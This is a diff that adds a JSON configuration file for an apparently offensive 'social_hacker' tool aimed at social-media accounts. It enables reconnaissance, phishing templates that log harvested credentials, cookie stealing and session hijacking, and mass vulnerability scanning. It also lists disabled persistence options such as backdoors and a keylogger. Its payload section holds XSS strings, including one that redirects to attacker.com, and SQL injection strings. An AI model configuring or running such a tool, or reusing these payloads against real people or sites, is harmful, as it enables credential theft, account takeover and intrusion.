@@ -1,0 +1,175 @@
+{
+  "general": {
+    "version": "1.0.0",
+    "language": "en",
+    "logging": {
+      "level": "INFO",
+      "file": "social_hacker.log",
+      "max_size": 10485760
+    },
+    "timeout": 10,
+    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "proxy": {
+      "enabled": false,
+      "url": ""
+    }
+  },
+  "reconnaissance": {
+    "instagram": {
+      "enabled": true,
+      "max_posts": 10,
+      "include_comments": false,
+      "include_likes": false,
+      "rate_limit": 1
+    },
+    "twitter": {
+      "enabled": false,
+      "api_key": "",
+      "api_secret": "",
+      "access_token": "",
+      "access_token_secret": ""
+    },
+    "facebook": {
+      "enabled": false,
+      "app_id": "",
+      "app_secret": ""
+    },
+    "linkedin": {
+      "enabled": false,
+      "client_id": "",
+      "client_secret": ""
+    },
+    "search_engines": {
+      "google": true,
+      "bing": false,
+      "duckduckgo": true
+    }
+  },
+  "credential_harvesting": {
+    "enabled": true,
+    "phishing": {
+      "templates": {
+        "facebook": true,
+        "twitter": true,
+        "instagram": true
+      },
+      "redirect_url": "https://www.facebook.com",
+      "log_file": "credentials.txt"
+    },
+    "form_grabber": {
+      "enabled": true,
+      "scan_forms": true,
+      "test_credentials": false
+    },
+    "brute_force": {
+      "enabled": false,
+      "wordlist": "rockyou.txt",
+      "threads": 5,
+      "delay": 1
+    }
+  },
+  "session_hijacking": {
+    "enabled": true,
+    "cookie_stealing": true,
+    "session_vulnerability_scan": true,
+    "cookie_security_checks": true,
+    "csrf_detection": true
+  },
+  "exploitation": {
+    "xss": {
+      "enabled": true,
+      "scan": true,
+      "exploit": false,
+      "payload": "<script>alert('XSS')</script>"
+    },
+    "sql_injection": {
+      "enabled": true,
+      "test": true,
+      "exploit": false
+    },
+    "csrf": {
+      "enabled": true,
+      "scan": true,
+      "exploit": false
+    },
+    "open_redirect": {
+      "enabled": true
+    },
+    "insecure_headers": {
+      "enabled": true
+    }
+  },
+  "persistence": {
+    "enabled": false,
+    "backdoors": {
+      "email": false,
+      "phone": false,
+      "recovery_code": false,
+      "trusted_device": false
+    },
+    "scheduled_tasks": {
+      "post_content": false,
+      "send_messages": false,
+      "check_activity": false,
+      "update_profile": false
+    },
+    "monitoring": {
+      "keylogger": false,
+      "activity_tracking": false,
+      "location_tracking": false
+    },
+    "remote_access": {
+      "enabled": false,
+      "methods": ["api"]
+    }
+  },
+  "mass_checker": {
+    "enabled": true,
+    "concurrency": 5,
+    "timeout": 10,
+    "retries": 3,
+    "vulnerability_types": ["xss", "sql_injection", "csrf", "open_redirect", "insecure_headers"]
+  },
+  "payloads": {
+    "xss_payloads": [
+      "<script>alert('XSS')</script>",
+      "<script>document.location='http://attacker.com';</script>",
+      "<img src=x onerror=alert('XSS')>",
+      "<svg/onload=alert('XSS')>"
+    ],
+    "sql_payloads": [
+      "' OR '1'='1",
+      "' OR 1=1 --",
+      "1' OR 1=1#",
+      "1\" OR 1=1#"
+    ],
+    "user_agents": [
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0"
+    ]
+  },
+  "reporting": {
+    "formats": ["json", "csv", "html", "txt"],
+    "output_directory": "reports",
+    "include_screenshots": false,
+    "include_raw_data": false,
+    "auto_save": true
+  },
+  "security": {
+    "encrypt_credentials": true,
+    "encryption_key": "",
+    "cleanup_temp_files": true,
+    "delete_logs": false,
+    "anonymize_ip": false
+  },
+  "modules": {
+    "recon": true,
+    "cred_harvest": true,
+    "session_hijack": true,
+    "exploit": true,
+    "persistence": false,
+    "mass_checker": true
+  }
+}
